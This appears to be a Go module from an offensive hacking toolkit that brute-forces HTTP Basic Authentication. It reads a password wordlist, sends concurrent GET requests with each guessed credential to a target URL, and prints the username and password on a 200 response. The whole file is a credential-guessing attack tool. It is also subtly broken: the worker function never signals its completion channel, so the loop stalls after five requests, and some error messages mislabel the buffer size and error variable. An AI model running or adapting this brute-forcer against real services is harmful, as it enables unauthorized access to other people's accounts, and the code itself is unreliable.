package Brute_Forcing_

import (
	"fmt"
	c "main/modg/colors"
	"net/http"
	"os"
	"strings"
)

type Information struct {
	URL      string
	Wordlist string
}

var (
	I        = Information{}
	finished = make(chan bool)
	ac       = 0
	mt       = 5
)

func HTTP_Authentication(user,
	pass string,
	channel chan bool) {

	http_ := http.Client{}
	req, x := http.NewRequest("GET", I.URL, nil)
	if x != nil {
		fmt.Println(c.REDB, "<RR6> Brute forcing -> Requests -> Methodized request -> GET: Could not create a new request to the given URL try fixing the error ->  ", x)
	} else {
		req.SetBasicAuth(user, pass)
		response, x := http_.Do(req)
		if x != nil {
			fmt.Println(c.REDB, "<RR6> Brute forcing -> Requests -> Methodized request -> GET: Could not make a GET request to the given urls with the set param for HTTP basic authentication, got error when running function on line 32 main/modg2 -> ", x)
		} else {
			if response.StatusCode == 200 {
				fmt.Println("|+| Username ", user)
				fmt.Println("|+| Password ", pass)
				os.Exit(0)
			}
		}
	}
}

func Run(url, wordlist, user string) {
	I.URL = url
	I.Wordlist = wordlist
	buf := make([]byte, 500000)
	f, x := os.Open(I.Wordlist)
	if x != nil {
		fmt.Println(c.REDHB, "<RR6> Brute forcing -> File -> I/O -> Reader: Got error when trying to open the file or read the contents of the file, this may be due to the fact that the file is corrupted, encrypted, not of right permissions, of the right ownership, or not of right location -> ", x)
	} else {
		defer f.Close()
		EOF, X := f.Read(buf)
		if X != nil {
			fmt.Println(c.REDHB, "<RR6> Brute Forcing -> File -> READER -> BUFFER: Got error when trying to read the 400k buffer into the file -> ", x)
		} else {
			l := strings.Split(string(buf[:EOF]), "\n")
			for _, password := range l {
				go HTTP_Authentication(user, password, finished)
				ac++
				if ac >= mt {
					<-finished
					ac -= 1
				}
			}
			for ac > 0 {
				<-finished
				ac -= 1
			}
		}
	}
}
